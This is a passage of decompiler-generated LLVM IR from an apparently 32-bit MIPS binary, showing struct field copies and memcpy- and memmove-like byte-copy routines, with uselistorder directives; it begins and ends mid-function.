  %v1_407674 = add i32 %v0_407674, 48
  %v2_407674 = inttoptr i32 %v1_407674 to i32*
  %v3_407674 = load i32, i32* %v2_407674, align 4
  store i32 %v3_407674, i32* %v0.global-to-local, align 4
  %v1_40767c = load i32, i32* %s0.global-to-local, align 4
  %v2_40767c = add i32 %v1_40767c, 52
  %v3_40767c = inttoptr i32 %v2_40767c to i32*
  store i32 %v3_407674, i32* %v3_40767c, align 4
  %v0_407680 = load i32, i32* %s1.global-to-local, align 4
  %v1_407680 = add i32 %v0_407680, 80
  %v2_407680 = inttoptr i32 %v1_407680 to i32*
  %v3_407680 = load i32, i32* %v2_407680, align 4
  store i32 %v3_407680, i32* %v0.global-to-local, align 4
  %v1_407688 = load i32, i32* %s0.global-to-local, align 4
  %v2_407688 = add i32 %v1_407688, 84
  %v3_407688 = inttoptr i32 %v2_407688 to i32*
  store i32 %v3_407680, i32* %v3_407688, align 4
  %v0_40768c = load i32, i32* %s1.global-to-local, align 4
  %v1_40768c = add i32 %v0_40768c, 84
  %v2_40768c = inttoptr i32 %v1_40768c to i32*
  %v3_40768c = load i32, i32* %v2_40768c, align 4
  store i32 %v3_40768c, i32* %v0.global-to-local, align 4
  %v1_407694 = load i32, i32* %s0.global-to-local, align 4
  %v2_407694 = add i32 %v1_407694, 88
  %v3_407694 = inttoptr i32 %v2_407694 to i32*
  store i32 %v3_40768c, i32* %v3_407694, align 4
  %v0_407698 = load i32, i32* %s1.global-to-local, align 4
  %v1_407698 = add i32 %v0_407698, 56
  %v2_407698 = inttoptr i32 %v1_407698 to i32*
  %v3_407698 = load i32, i32* %v2_407698, align 4
  store i32 %v3_407698, i32* %v0.global-to-local, align 4
  %v1_4076a0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076a0 = add i32 %v1_4076a0, 60
  %v3_4076a0 = inttoptr i32 %v2_4076a0 to i32*
  store i32 %v3_407698, i32* %v3_4076a0, align 4
  %v0_4076a4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076a4 = add i32 %v0_4076a4, 64
  %v2_4076a4 = inttoptr i32 %v1_4076a4 to i32*
  %v3_4076a4 = load i32, i32* %v2_4076a4, align 4
  store i32 %v3_4076a4, i32* %v0.global-to-local, align 4
  %v1_4076ac = load i32, i32* %s0.global-to-local, align 4
  %v2_4076ac = add i32 %v1_4076ac, 68
  %v3_4076ac = inttoptr i32 %v2_4076ac to i32*
  store i32 %v3_4076a4, i32* %v3_4076ac, align 4
  %v0_4076b0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076b0 = add i32 %v0_4076b0, 72
  %v2_4076b0 = inttoptr i32 %v1_4076b0 to i32*
  %v3_4076b0 = load i32, i32* %v2_4076b0, align 4
  store i32 %v3_4076b0, i32* %v0.global-to-local, align 4
  %v1_4076b8 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076b8 = add i32 %v1_4076b8, 76
  %v3_4076b8 = inttoptr i32 %v2_4076b8 to i32*
  store i32 %v3_4076b0, i32* %v3_4076b8, align 4
  %v0_4076bc = load i32, i32* %s1.global-to-local, align 4
  %v1_4076bc = add i32 %v0_4076bc, 60
  %v2_4076bc = inttoptr i32 %v1_4076bc to i32*
  %v3_4076bc = load i32, i32* %v2_4076bc, align 4
  store i32 %v3_4076bc, i32* %v0.global-to-local, align 4
  %v1_4076c4 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076c4 = add i32 %v1_4076c4, 64
  %v3_4076c4 = inttoptr i32 %v2_4076c4 to i32*
  store i32 %v3_4076bc, i32* %v3_4076c4, align 4
  %v0_4076c8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076c8 = add i32 %v0_4076c8, 68
  %v2_4076c8 = inttoptr i32 %v1_4076c8 to i32*
  %v3_4076c8 = load i32, i32* %v2_4076c8, align 4
  store i32 %v3_4076c8, i32* %v0.global-to-local, align 4
  %v1_4076d0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076d0 = add i32 %v1_4076d0, 72
  %v3_4076d0 = inttoptr i32 %v2_4076d0 to i32*
  store i32 %v3_4076c8, i32* %v3_4076d0, align 4
  %v0_4076d4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076d4 = add i32 %v0_4076d4, 76
  %v2_4076d4 = inttoptr i32 %v1_4076d4 to i32*
  %v3_4076d4 = load i32, i32* %v2_4076d4, align 4
  store i32 %v3_4076d4, i32* %v0.global-to-local, align 4
  %v1_4076dc = load i32, i32* %s0.global-to-local, align 4
  %v2_4076dc = add i32 %v1_4076dc, 80
  %v3_4076dc = inttoptr i32 %v2_4076dc to i32*
  store i32 %v3_4076d4, i32* %v3_4076dc, align 4
  ret i32 %v3_4076d4

; uselistorder directives
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 9, 10, 11, 12, 13, 15 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 64, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 48, { 1, 0, 2, 3 }
  uselistorder i32 40, { 3, 4, 5, 6, 2, 7, 8, 1, 9, 0, 10 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_407700(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407700:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t2.global-to-local = alloca i32, align 4
  %t3.global-to-local = alloca i32, align 4
  %t4.global-to-local = alloca i32, align 4
  %t5.global-to-local = alloca i32, align 4
  %t6.global-to-local = alloca i32, align 4
  %t7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %a1.global-to-local, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %v0_407700 = load i32, i32* %a2.global-to-local, align 4
  %v1_407700 = icmp slt i32 %v0_407700, 8
  %v2_407700 = zext i1 %v1_407700 to i32
  store i32 %v2_407700, i32* %t0.global-to-local, align 4
  %v2_407704 = load i32, i32* %a0.global-to-local, align 4
  br i1 %v1_407700, label %dec_label_pc_4077c0, label %dec_label_pc_407708

dec_label_pc_407708:                              ; preds = %dec_label_pc_407700
  %v0_40770c = load i32, i32* %a1.global-to-local, align 4
  %v2_40770c = xor i32 %v0_40770c, %v2_407704
  %v1_407710 = urem i32 %v2_40770c, 4
  store i32 %v1_407710, i32* %t0.global-to-local, align 4
  %v1_407714 = icmp eq i32 %v1_407710, 0
  %v3_407714 = sub i32 0, %v0_40770c
  store i32 %v3_407714, i32* %t1.global-to-local, align 4
  br i1 %v1_407714, label %dec_label_pc_407718, label %dec_label_pc_4077e4

dec_label_pc_407718:                              ; preds = %dec_label_pc_407708
  %v1_40771c = urem i32 %v3_407714, 4
  store i32 %v1_40771c, i32* %t1.global-to-local, align 4
  %v1_407720 = icmp eq i32 %v1_40771c, 0
  %v4_407720 = sub i32 %v0_407700, %v1_40771c
  store i32 %v4_407720, i32* %a2.global-to-local, align 4
  br i1 %v1_407720, label %dec_label_pc_407738, label %dec_label_pc_407724

dec_label_pc_407724:                              ; preds = %dec_label_pc_407718
  %v2_40772c = add i32 %v1_40771c, %v0_40770c
  store i32 %v2_40772c, i32* %a1.global-to-local, align 4
  %v2_407734 = add i32 %v1_40771c, %v2_407704
  store i32 %v2_407734, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407738

dec_label_pc_407738:                              ; preds = %dec_label_pc_407718, %dec_label_pc_407724
  %v0_40776c10 = phi i32 [ %v2_407704, %dec_label_pc_407718 ], [ %v2_407734, %dec_label_pc_407724 ]
  %v1_407744 = phi i32 [ %v0_40770c, %dec_label_pc_407718 ], [ %v2_40772c, %dec_label_pc_407724 ]
  %v1_407738 = urem i32 %v4_407720, 32
  store i32 %v1_407738, i32* %t0.global-to-local, align 4
  %v2_40773c = icmp eq i32 %v4_407720, %v1_407738
  %v5_40773c = sub i32 %v4_407720, %v1_407738
  store i32 %v5_40773c, i32* %a3.global-to-local, align 4
  br i1 %v2_40773c, label %dec_label_pc_407798, label %dec_label_pc_407740

dec_label_pc_407740:                              ; preds = %dec_label_pc_407738
  %v2_407744 = add i32 %v1_407744, %v5_40773c
  store i32 %v2_407744, i32* %a3.global-to-local, align 4
  store i32 %v1_407738, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_40774c

dec_label_pc_40774c:                              ; preds = %dec_label_pc_40774c.dec_label_pc_40774c_crit_edge, %dec_label_pc_407740
  %v0_40776c = phi i32 [ %v0_40776c.pre, %dec_label_pc_40774c.dec_label_pc_40774c_crit_edge ], [ %v0_40776c10, %dec_label_pc_407740 ]
  %v0_407770 = phi i32 [ %v0_40774c.pre, %dec_label_pc_40774c.dec_label_pc_40774c_crit_edge ], [ %v1_407744, %dec_label_pc_407740 ]
  %v1_40774c = inttoptr i32 %v0_407770 to i32*
  %v2_40774c = load i32, i32* %v1_40774c, align 4
  store i32 %v2_40774c, i32* %t0.global-to-local, align 4
  %v1_407750 = add i32 %v0_407770, 4
  %v2_407750 = inttoptr i32 %v1_407750 to i32*
  %v3_407750 = load i32, i32* %v2_407750, align 4
  store i32 %v3_407750, i32* %t1.global-to-local, align 4
  %v1_407754 = add i32 %v0_407770, 8
  %v2_407754 = inttoptr i32 %v1_407754 to i32*
  %v3_407754 = load i32, i32* %v2_407754, align 4
  store i32 %v3_407754, i32* %t2.global-to-local, align 4
  %v1_407758 = add i32 %v0_407770, 12
  %v2_407758 = inttoptr i32 %v1_407758 to i32*
  %v3_407758 = load i32, i32* %v2_407758, align 4
  store i32 %v3_407758, i32* %t3.global-to-local, align 4
  %v1_40775c = add i32 %v0_407770, 16
  %v2_40775c = inttoptr i32 %v1_40775c to i32*
  %v3_40775c = load i32, i32* %v2_40775c, align 4
  store i32 %v3_40775c, i32* %t4.global-to-local, align 4
  %v1_407760 = add i32 %v0_407770, 20
  %v2_407760 = inttoptr i32 %v1_407760 to i32*
  %v3_407760 = load i32, i32* %v2_407760, align 4
  store i32 %v3_407760, i32* %t5.global-to-local, align 4
  %v1_407764 = add i32 %v0_407770, 24
  %v2_407764 = inttoptr i32 %v1_407764 to i32*
  %v3_407764 = load i32, i32* %v2_407764, align 4
  store i32 %v3_407764, i32* %t6.global-to-local, align 4
  %v1_407768 = add i32 %v0_407770, 28
  %v2_407768 = inttoptr i32 %v1_407768 to i32*
  %v3_407768 = load i32, i32* %v2_407768, align 4
  store i32 %v3_407768, i32* %t7.global-to-local, align 4
  %v1_40776c = add i32 %v0_40776c, 32
  store i32 %v1_40776c, i32* %a0.global-to-local, align 4
  %v1_407770 = add i32 %v0_407770, 32
  store i32 %v1_407770, i32* %a1.global-to-local, align 4
  %v3_407774 = inttoptr i32 %v0_40776c to i32*
  store i32 %v2_40774c, i32* %v3_407774, align 4
  %v0_407778 = load i32, i32* %t1.global-to-local, align 4
  %v1_407778 = load i32, i32* %a0.global-to-local, align 4
  %v2_407778 = add i32 %v1_407778, -28
  %v3_407778 = inttoptr i32 %v2_407778 to i32*
  store i32 %v0_407778, i32* %v3_407778, align 4
  %v0_40777c = load i32, i32* %t2.global-to-local, align 4
  %v1_40777c = load i32, i32* %a0.global-to-local, align 4
  %v2_40777c = add i32 %v1_40777c, -24
  %v3_40777c = inttoptr i32 %v2_40777c to i32*
  store i32 %v0_40777c, i32* %v3_40777c, align 4
  %v0_407780 = load i32, i32* %t3.global-to-local, align 4
  %v1_407780 = load i32, i32* %a0.global-to-local, align 4
  %v2_407780 = add i32 %v1_407780, -20
  %v3_407780 = inttoptr i32 %v2_407780 to i32*
  store i32 %v0_407780, i32* %v3_407780, align 4
  %v0_407784 = load i32, i32* %t4.global-to-local, align 4
  %v1_407784 = load i32, i32* %a0.global-to-local, align 4
  %v2_407784 = add i32 %v1_407784, -16
  %v3_407784 = inttoptr i32 %v2_407784 to i32*
  store i32 %v0_407784, i32* %v3_407784, align 4
  %v0_407788 = load i32, i32* %t5.global-to-local, align 4
  %v1_407788 = load i32, i32* %a0.global-to-local, align 4
  %v2_407788 = add i32 %v1_407788, -12
  %v3_407788 = inttoptr i32 %v2_407788 to i32*
  store i32 %v0_407788, i32* %v3_407788, align 4
  %v0_40778c = load i32, i32* %t6.global-to-local, align 4
  %v1_40778c = load i32, i32* %a0.global-to-local, align 4
  %v2_40778c = add i32 %v1_40778c, -8
  %v3_40778c = inttoptr i32 %v2_40778c to i32*
  store i32 %v0_40778c, i32* %v3_40778c, align 4
  %v0_407790 = load i32, i32* %a1.global-to-local, align 4
  %v1_407790 = load i32, i32* %a3.global-to-local, align 4
  %v2_407790 = icmp eq i32 %v0_407790, %v1_407790
  %v3_407790 = load i32, i32* %t7.global-to-local, align 4
  %v4_407790 = load i32, i32* %a0.global-to-local, align 4
  %v5_407790 = add i32 %v4_407790, -4
  %v6_407790 = inttoptr i32 %v5_407790 to i32*
  store i32 %v3_407790, i32* %v6_407790, align 4
  br i1 %v2_407790, label %dec_label_pc_407798.loopexit, label %dec_label_pc_40774c.dec_label_pc_40774c_crit_edge

dec_label_pc_40774c.dec_label_pc_40774c_crit_edge: ; preds = %dec_label_pc_40774c
  %v0_40774c.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_40776c.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_40774c

dec_label_pc_407798.loopexit:                     ; preds = %dec_label_pc_40774c
  %v0_407798.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_407798

dec_label_pc_407798:                              ; preds = %dec_label_pc_407798.loopexit, %dec_label_pc_407738
  %v0_407798 = phi i32 [ %v0_407798.pre, %dec_label_pc_407798.loopexit ], [ %v4_407720, %dec_label_pc_407738 ]
  %v1_407798 = urem i32 %v0_407798, 4
  store i32 %v1_407798, i32* %t0.global-to-local, align 4
  %v2_40779c = icmp eq i32 %v0_407798, %v1_407798
  %v5_40779c = sub i32 %v0_407798, %v1_407798
  store i32 %v5_40779c, i32* %a3.global-to-local, align 4
  br i1 %v2_40779c, label %dec_label_pc_4077c0, label %dec_label_pc_4077a0

dec_label_pc_4077a0:                              ; preds = %dec_label_pc_407798
  %v1_4077a4 = load i32, i32* %a1.global-to-local, align 4
  %v2_4077a4 = add i32 %v1_4077a4, %v5_40779c
  store i32 %v2_4077a4, i32* %a3.global-to-local, align 4
  store i32 %v1_407798, i32* %a2.global-to-local, align 4
  %v1_4077ac30 = inttoptr i32 %v1_4077a4 to i32*
  %v2_4077ac31 = load i32, i32* %v1_4077ac30, align 4
  store i32 %v2_4077ac31, i32* %t0.global-to-local, align 4
  %v0_4077b032 = load i32, i32* %a0.global-to-local, align 4
  %v1_4077b033 = add i32 %v0_4077b032, 4
  store i32 %v1_4077b033, i32* %a0.global-to-local, align 4
  %v1_4077b434 = add i32 %v1_4077a4, 4
  store i32 %v1_4077b434, i32* %a1.global-to-local, align 4
  %v2_4077b835 = icmp eq i32 %v1_4077b434, %v2_4077a4
  %v6_4077b836 = inttoptr i32 %v0_4077b032 to i32*
  store i32 %v2_4077ac31, i32* %v6_4077b836, align 4
  br i1 %v2_4077b835, label %dec_label_pc_4077c0.loopexit, label %dec_label_pc_4077ac.dec_label_pc_4077ac_crit_edge

dec_label_pc_4077ac.dec_label_pc_4077ac_crit_edge: ; preds = %dec_label_pc_4077a0, %dec_label_pc_4077ac.dec_label_pc_4077ac_crit_edge
  %v0_4077ac.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_4077b8.pre = load i32, i32* %a3.global-to-local, align 4
  %v1_4077ac = inttoptr i32 %v0_4077ac.pre to i32*
  %v2_4077ac = load i32, i32* %v1_4077ac, align 4
  store i32 %v2_4077ac, i32* %t0.global-to-local, align 4
  %v0_4077b0 = load i32, i32* %a0.global-to-local, align 4
  %v1_4077b0 = add i32 %v0_4077b0, 4
  store i32 %v1_4077b0, i32* %a0.global-to-local, align 4
  %v1_4077b4 = add i32 %v0_4077ac.pre, 4
  store i32 %v1_4077b4, i32* %a1.global-to-local, align 4
  %v2_4077b8 = icmp eq i32 %v1_4077b4, %v1_4077b8.pre
  %v6_4077b8 = inttoptr i32 %v0_4077b0 to i32*
  store i32 %v2_4077ac, i32* %v6_4077b8, align 4
  br i1 %v2_4077b8, label %dec_label_pc_4077c0.loopexit, label %dec_label_pc_4077ac.dec_label_pc_4077ac_crit_edge

dec_label_pc_4077c0.loopexit:                     ; preds = %dec_label_pc_4077ac.dec_label_pc_4077ac_crit_edge, %dec_label_pc_4077a0
  %v0_4077c0.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4077c0

dec_label_pc_4077c0:                              ; preds = %dec_label_pc_4077c0.loopexit, %dec_label_pc_407798, %dec_label_pc_407700
  %v0_4077c0 = phi i32 [ %v0_4077c0.pre, %dec_label_pc_4077c0.loopexit ], [ %v0_407798, %dec_label_pc_407798 ], [ %v0_407700, %dec_label_pc_407700 ]
  %v1_4077c0 = icmp slt i32 %v0_4077c0, 1
  %v3_4077c0 = load i32, i32* %a1.global-to-local, align 4
  %v4_4077c0 = add i32 %v3_4077c0, %v0_4077c0
  store i32 %v4_4077c0, i32* @a3, align 4
  br i1 %v1_4077c0, label %dec_label_pc_4077dc, label %dec_label_pc_4077c8.preheader

dec_label_pc_4077c8.preheader:                    ; preds = %dec_label_pc_4077c0
  %v1_4077c822 = inttoptr i32 %v3_4077c0 to i8*
  %v2_4077c823 = load i8, i8* %v1_4077c822, align 1
  %v3_4077c824 = sext i8 %v2_4077c823 to i32
  store i32 %v3_4077c824, i32* %t0.global-to-local, align 4
  %v0_4077cc25 = load i32, i32* %a0.global-to-local, align 4
  %v1_4077cc26 = add i32 %v0_4077cc25, 1
  store i32 %v1_4077cc26, i32* %a0.global-to-local, align 4
  %v1_4077d027 = add i32 %v3_4077c0, 1
  store i32 %v1_4077d027, i32* %a1.global-to-local, align 4
  %v2_4077d428 = icmp eq i32 %v1_4077d027, %v4_4077c0
  %v7_4077d429 = inttoptr i32 %v0_4077cc25 to i8*
  store i8 %v2_4077c823, i8* %v7_4077d429, align 1
  br i1 %v2_4077d428, label %dec_label_pc_4077dc, label %dec_label_pc_4077c8.dec_label_pc_4077c8_crit_edge

dec_label_pc_4077c8.dec_label_pc_4077c8_crit_edge: ; preds = %dec_label_pc_4077c8.preheader, %dec_label_pc_4077c8.dec_label_pc_4077c8_crit_edge
  %v0_4077c8.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_4077d4.pre = load i32, i32* @a3, align 4
  %v1_4077c8 = inttoptr i32 %v0_4077c8.pre to i8*
  %v2_4077c8 = load i8, i8* %v1_4077c8, align 1
  %v3_4077c8 = sext i8 %v2_4077c8 to i32
  store i32 %v3_4077c8, i32* %t0.global-to-local, align 4
  %v0_4077cc = load i32, i32* %a0.global-to-local, align 4
  %v1_4077cc = add i32 %v0_4077cc, 1
  store i32 %v1_4077cc, i32* %a0.global-to-local, align 4
  %v1_4077d0 = add i32 %v0_4077c8.pre, 1
  store i32 %v1_4077d0, i32* %a1.global-to-local, align 4
  %v2_4077d4 = icmp eq i32 %v1_4077d0, %v1_4077d4.pre
  %v7_4077d4 = inttoptr i32 %v0_4077cc to i8*
  store i8 %v2_4077c8, i8* %v7_4077d4, align 1
  br i1 %v2_4077d4, label %dec_label_pc_4077dc, label %dec_label_pc_4077c8.dec_label_pc_4077c8_crit_edge

dec_label_pc_4077dc:                              ; preds = %dec_label_pc_4077c8.preheader, %dec_label_pc_4077c8.dec_label_pc_4077c8_crit_edge, %dec_label_pc_4077c0
  ret i32 %v2_407704

dec_label_pc_4077e4:                              ; preds = %dec_label_pc_407708
  %v1_4077e4 = sub i32 0, %v2_407704
  %v1_4077e8 = urem i32 %v1_4077e4, 4
  store i32 %v1_4077e8, i32* %a3.global-to-local, align 4
  %v1_4077ec = icmp eq i32 %v1_4077e8, 0
  %v4_4077ec = sub i32 %v0_407700, %v1_4077e8
  store i32 %v4_4077ec, i32* %a2.global-to-local, align 4
  br i1 %v1_4077ec, label %dec_label_pc_407808, label %dec_label_pc_4077f0

dec_label_pc_4077f0:                              ; preds = %dec_label_pc_4077e4
  %v2_4077fc = add i32 %v0_40770c, %v1_4077e8
  store i32 %v2_4077fc, i32* %a1.global-to-local, align 4
  %v2_407804 = add i32 %v1_4077e8, %v2_407704
  store i32 %v2_407804, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407808

dec_label_pc_407808:                              ; preds = %dec_label_pc_4077e4, %dec_label_pc_4077f0
  %v0_40781c3 = phi i32 [ %v2_407704, %dec_label_pc_4077e4 ], [ %v2_407804, %dec_label_pc_4077f0 ]
  %v1_407810 = phi i32 [ %v0_40770c, %dec_label_pc_4077e4 ], [ %v2_4077fc, %dec_label_pc_4077f0 ]
  %v1_407808 = urem i32 %v4_4077ec, 4
  store i32 %v1_407808, i32* %t0.global-to-local, align 4
  %v2_40780c = sub i32 %v4_4077ec, %v1_407808
  %v2_407810 = add i32 %v1_407810, %v2_40780c
  store i32 %v2_407810, i32* @a3, align 4
  %v1_40781c37 = add i32 %v0_40781c3, 4
  store i32 %v1_40781c37, i32* %a0.global-to-local, align 4
  %v1_40782038 = add i32 %v1_407810, 4
  store i32 %v1_40782038, i32* %a1.global-to-local, align 4
  %v2_40782439 = icmp eq i32 %v1_40782038, %v2_407810
  %v6_40782440 = inttoptr i32 %v0_40781c3 to i32*
  store i32 %v3_407714, i32* %v6_40782440, align 4
  br i1 %v2_40782439, label %dec_label_pc_407828, label %dec_label_pc_407814.dec_label_pc_407814_crit_edge

dec_label_pc_407814.dec_label_pc_407814_crit_edge: ; preds = %dec_label_pc_407808, %dec_label_pc_407814.dec_label_pc_407814_crit_edge
  %v0_40781c.pre = load i32, i32* %a0.global-to-local, align 4
  %v0_407820.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_407824.pre = load i32, i32* @a3, align 4
  %v3_407824.pre = load i32, i32* %t1.global-to-local, align 4
  %v1_40781c = add i32 %v0_40781c.pre, 4
  store i32 %v1_40781c, i32* %a0.global-to-local, align 4
  %v1_407820 = add i32 %v0_407820.pre, 4
  store i32 %v1_407820, i32* %a1.global-to-local, align 4
  %v2_407824 = icmp eq i32 %v1_407820, %v1_407824.pre
  %v6_407824 = inttoptr i32 %v0_40781c.pre to i32*
  store i32 %v3_407824.pre, i32* %v6_407824, align 4
  br i1 %v2_407824, label %dec_label_pc_407828, label %dec_label_pc_407814.dec_label_pc_407814_crit_edge

dec_label_pc_407828:                              ; preds = %dec_label_pc_407814.dec_label_pc_407814_crit_edge, %dec_label_pc_407808
  %v0_407830 = load i32, i32* %t0.global-to-local, align 4
  store i32 %v0_407830, i32* %a2.global-to-local, align 4
  ret i32 %v2_407704

; uselistorder directives
  uselistorder i32 %v0_40781c.pre, { 1, 0 }
  uselistorder i32 %v1_407808, { 1, 0 }
  uselistorder i32 %v4_4077ec, { 1, 0, 2 }
  uselistorder i32 %v1_4077e8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_4077c8.pre, { 1, 0 }
  uselistorder i32 %v0_4077ac.pre, { 1, 0 }
  uselistorder i32 %v1_407798, { 3, 1, 2, 0 }
  uselistorder i32 %v0_407798, { 1, 2, 3, 0 }
  uselistorder i32 %v0_407770, { 0, 2, 1, 4, 3, 6, 5, 8, 7 }
  uselistorder i32 %v0_40776c, { 1, 0 }
  uselistorder i32 %v1_407738, { 3, 1, 2, 0 }
  uselistorder i32 %v1_407744, { 1, 0 }
  uselistorder i32 %v4_407720, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_40771c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_407714, { 1, 0, 2 }
  uselistorder i32 %v1_407710, { 1, 0 }
  uselistorder i32 %v0_40770c, { 4, 0, 3, 1, 5, 2 }
  uselistorder i32 %v2_407704, { 6, 4, 0, 5, 7, 3, 1, 2 }
  uselistorder i32 %v0_407700, { 2, 0, 1, 3 }
  uselistorder i32* %t1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %t0.global-to-local, { 0, 1, 2, 9, 3, 10, 4, 5, 6, 7, 8 }
  uselistorder i32* %a2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %a1.global-to-local, { 2, 16, 17, 3, 4, 11, 12, 14, 5, 13, 15, 9, 7, 6, 8, 10, 0, 1 }
  uselistorder i32* %a0.global-to-local, { 2, 22, 23, 3, 4, 17, 18, 19, 5, 20, 21, 15, 13, 6, 7, 8, 9, 10, 11, 12, 14, 16, 0, 1 }
  uselistorder label %dec_label_pc_407814.dec_label_pc_407814_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407808, { 1, 0 }
  uselistorder label %dec_label_pc_4077dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4077c8.dec_label_pc_4077c8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_4077ac.dec_label_pc_4077ac_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407738, { 1, 0 }
}

define i32 @function_407840(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407840:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t2.global-to-local = alloca i32, align 4
  %t3.global-to-local = alloca i32, align 4
  %t4.global-to-local = alloca i32, align 4
  %t5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %v1_407848 = load i32, i32* @t9, align 4
  %v2_407848 = add i32 %v1_407848, 301456
  store i32 %v2_407848, i32* %gp.global-to-local, align 4
  %v2_40785c = sub i32 %arg1, %arg2
  %v2_407860 = icmp ult i32 %v2_40785c, %arg3
  %v3_407860 = zext i1 %v2_407860 to i32
  store i32 %v3_407860, i32* %v0.global-to-local, align 4
  store i32 %arg1, i32* %s0.global-to-local, align 4
  store i32 %arg3, i32* %v1.global-to-local, align 4
  br i1 %v2_407860, label %dec_label_pc_40788c, label %dec_label_pc_40786c

dec_label_pc_40786c:                              ; preds = %dec_label_pc_407840
  %v1_407878 = call i32 @unknown_0()
  store i32 %v2_407848, i32* %gp.global-to-local, align 4
  %v0_407888 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_407888, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40788c

dec_label_pc_40788c:                              ; preds = %dec_label_pc_407840, %dec_label_pc_40786c
  %v1_40788c = icmp ult i32 %arg3, 16
  %v2_40788c = zext i1 %v1_40788c to i32
  store i32 %v2_40788c, i32* %v0.global-to-local, align 4
  %v2_407890 = add i32 %arg3, %arg2
  store i32 %v2_407890, i32* %a1.global-to-local, align 4
  %v4_407894 = add i32 %arg3, %arg1
  store i32 %v4_407894, i32* %t2.global-to-local, align 4
  br i1 %v1_40788c, label %dec_label_pc_40788c.dec_label_pc_407b38_crit_edge, label %dec_label_pc_407898

dec_label_pc_40788c.dec_label_pc_407b38_crit_edge: ; preds = %dec_label_pc_40788c
  %v0_407b3c.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_407b38

dec_label_pc_407898:                              ; preds = %dec_label_pc_40788c
  %v1_40789c = urem i32 %v4_407894, 4
  store i32 %v1_40789c, i32* %v0.global-to-local, align 4
  %v2_4078a0 = sub i32 %arg3, %v1_40789c
  store i32 %v2_4078a0, i32* %a2.global-to-local, align 4
  store i32 %v1_40789c, i32* %v1.global-to-local, align 4
  %v1_4078ac30 = add i32 %v2_407890, -1
  store i32 %v1_4078ac30, i32* %a1.global-to-local, align 4
  %v1_4078b031 = inttoptr i32 %v1_4078ac30 to i8*
  %v2_4078b032 = load i8, i8* %v1_4078b031, align 1
  %v3_4078b033 = zext i8 %v2_4078b032 to i32
  store i32 %v3_4078b033, i32* %v0.global-to-local, align 4
  %v1_4078b434 = add i32 %v4_407894, -1
  store i32 %v1_4078b434, i32* %t2.global-to-local, align 4
  %v3_4078b835 = inttoptr i32 %v1_4078b434 to i8*
  store i8 %v2_4078b032, i8* %v3_4078b835, align 1
  %v0_4078bc36 = load i32, i32* %v1.global-to-local, align 4
  %v1_4078bc37 = icmp eq i32 %v0_4078bc36, 0
  %v3_4078bc38 = add i32 %v0_4078bc36, -1
  store i32 %v3_4078bc38, i32* %v1.global-to-local, align 4
  %v0_4078c439 = load i32, i32* %a1.global-to-local, align 4
  br i1 %v1_4078bc37, label %dec_label_pc_4078c0, label %dec_label_pc_4078ac.dec_label_pc_4078ac_crit_edge

dec_label_pc_4078ac.dec_label_pc_4078ac_crit_edge: ; preds = %dec_label_pc_407898, %dec_label_pc_4078ac.dec_label_pc_4078ac_crit_edge
  %v0_4078c440 = phi i32 [ %v0_4078c4, %dec_label_pc_4078ac.dec_label_pc_4078ac_crit_edge ], [ %v0_4078c439, %dec_label_pc_407898 ]
  %v0_4078b4.pre = load i32, i32* %t2.global-to-local, align 4
  %v1_4078ac = add i32 %v0_4078c440, -1
  store i32 %v1_4078ac, i32* %a1.global-to-local, align 4
  %v1_4078b0 = inttoptr i32 %v1_4078ac to i8*
